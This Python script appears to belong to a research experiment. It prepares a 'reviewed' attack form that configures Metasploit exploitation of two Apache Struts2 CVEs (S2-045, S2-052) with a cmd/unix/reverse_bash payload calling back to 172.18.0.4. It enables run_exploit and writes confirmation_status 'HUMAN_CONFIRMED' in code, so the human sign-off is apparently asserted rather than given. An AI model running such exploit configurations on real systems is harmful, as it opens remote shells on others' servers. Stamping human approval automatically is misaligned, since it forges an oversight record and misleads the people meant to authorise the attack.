"""Prepare a review copy from HdiiR evidence only; never alters canonical form."""
import json
from pathlib import Path
import yaml

ROOT=Path(__file__).resolve().parents[4]
FORM=ROOT/'output/2d8ru-struts2-prospective/resolver/forms/attack_form_HdiiR_r1.yaml'
OUT=ROOT/'research/llm_reasoning/prospective_experiment/runs/HdiiR/review/attack_form_HdiiR_r1_reviewed_v3.yaml'
LHOST='172.18.0.4'; INCLUDED={
 'CVE-2017-5638':('/S2-045/',16051),
 'CVE-2017-9805':('/S2-052/orders/3',16052),
}
def confirm(x,v=None): x['confirmed']=x.get('suggested') if v is None else v
def main():
 d=yaml.safe_load(FORM.read_text(encoding='utf8'))
 for c,x in d['cves'].items():
  if c not in INCLUDED:
   x['decision']={'confirmed':'skip','reason':'Current HdiiR endpoint/path and exploit preconditions were not independently confirmed; excluded from prospective BEFORE attribution.'}
   continue
  uri,port=INCLUDED[c]; confirm(x['target']['index']); confirm(x['target']['name']); confirm(x['targeturi'],uri)
  confirm(x['environment']['rport'],8080); confirm(x['environment']['lhost'],LHOST)
  # Resolver's current structured MSF metadata supplies these suggested
  # defaults.  Confirm only required options with a concrete current default.
  for opt in x['module_options'].values():
   if opt.get('required') and opt.get('suggested') is not None: confirm(opt)
  confirm(x['payload'],'cmd/unix/reverse_bash')
  # Live production introspection (not historical data) supplied this exact
  # schema/default set for cmd/unix/reverse_bash. LHOST/LPORT are current
  # HdiiR environment values; the rest retain MSF's current defaults.
  x.setdefault('payload_options',{}).setdefault('LHOST',{})['confirmed']=LHOST
  x['payload_options'].setdefault('LPORT',{})['confirmed']=port
  for name,value in {'ReverseAllowProxy':False,'ReverseListenerThreaded':False,
                     'AutoVerifySession':True,'BashPath':'bash','ShellPath':'sh'}.items():
   x['payload_options'].setdefault(name,{})['confirmed']=value
  p=x['execution_protocol']; p.update(mode='check-then-exploit',confirmed=True,confirmation_status='HUMAN_CONFIRMED',run_check=True,run_exploit=True,session_confirmation_expected=True)
 OUT.parent.mkdir(parents=True,exist_ok=True); OUT.write_text(yaml.safe_dump(d,sort_keys=False,allow_unicode=True),encoding='utf8')
 print(OUT)
if __name__=='__main__': main()
